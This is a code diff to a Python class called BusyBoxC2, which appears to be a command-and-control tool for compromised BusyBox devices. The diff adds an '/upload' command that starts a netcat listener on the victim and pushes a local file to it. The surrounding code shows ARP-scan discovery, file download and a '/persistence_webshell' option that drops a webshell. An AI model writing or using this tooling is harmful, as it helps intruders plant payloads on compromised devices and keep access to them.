@@ -130,6 +130,16 @@ class BusyBoxC2:
 
         return listening_port, t
     
+    def _upload(self):
+        file_name = input("File to upload: ")
+        listening_port = random.randint(1024, 65534)
+        remote_cmd = "nc -lp " + str(listening_port) + " > " + file_name
+        t = threading.Thread(target=self._send_cmd, args=(remote_cmd,))
+        t.start()
+        local_cmd = "sleep 0.2; busybox nc " + self.server_ip + " " + str(listening_port) + " < " + file_name
+        os.system(local_cmd)
+
+    
     def _install_webshell(self):
 
         ### ToDo : Upload a tar archive and extract it to preserve execution rights on files.
@@ -190,8 +200,10 @@ class BusyBoxC2:
                             self._discover_arp_scan()
                         case '/download':
                             self._download()
+                        case '/upload':
+                            self._upload()
                         case '/persistence_webshell':
-                            # launch web server and drop pwnyshell
+                            # work only without obfuscation
                             self._install_webshell()
                             pass
                         case _:
